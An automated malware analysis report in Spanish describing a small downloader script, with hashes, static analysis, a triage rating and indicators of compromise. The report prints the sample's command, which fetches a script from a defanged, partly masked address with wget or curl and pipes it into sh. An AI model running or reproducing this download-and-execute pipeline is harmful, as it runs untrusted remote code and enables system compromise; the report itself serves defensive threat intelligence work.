# 🧬 Payload Analysis

`ace55c47ae419948a9a568c7b71c92d6f44673cdf3dce16a409d075341e77dc4`

## 📌 Resumen

Texto ASCII de 801 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://14.46.136.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `curl -sk hxxps://14.46.136.XXX/sh)`
2. `sh -s apache.selfr` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ace55c47ae419948a9a568c7b71c92d6f44673cdf3dce16a409d075341e77dc4.md](../../../../../malware-like/oraculo/downloader/ace55c47ae419948a9a568c7b71c92d6f44673cdf3dce16a409d075341e77dc4.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:32:17.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ace55c47ae419948a9a568c7b71c92d6f44673cdf3dce16a409d075341e77dc4`
- **SHA1:** `d8bfa5a36e414a308de76ccdda16a2dde28738a2`
- **MD5:** `c944a166ec7f5b076dd2dfaad5140fef`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 801 B |
| Entropía | 5.2 |
| Strings | 17 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.140.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| hash | ace55c47ae419948a9a568c7b71c92d6f44673cdf3dce16a409d075341e77dc4 | static_analysis |
| ip | 170.9.16.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
